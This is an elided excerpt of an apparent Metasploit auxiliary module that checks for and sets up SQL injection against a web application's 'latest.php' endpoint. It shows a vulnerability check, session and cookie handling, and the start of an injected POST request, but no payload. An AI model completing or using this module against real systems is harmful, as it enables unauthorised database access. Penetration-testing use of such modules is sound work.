...
class MetasploitModule < Msf::Auxiliary
  ...
  def check
    ...
    return Msf::Exploit::CheckCode::Safe unless res && res.body
    ...
    return Msf::Exploit::CheckCode::Vulnerable if match[1] == flag
  ...
  def authenticate
    ...
    if datastore['REQUIREAUTH']
      ...
      if res.code == 302
        ...
        res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'latest.php'),
                               'vars_get' => {
                                 'ddreset' => '1'
                               },
                               'cookies' => cookies)
  ...
  def make_injected_request(sql, sid, cookies)
    send_request_cgi('uri' => normalize_uri(target_uri.path, 'latest.php'),
                     'method' => 'POST',
                     'vars_get' => {
                       'output' => 'ajax',
                       'sid' => sid
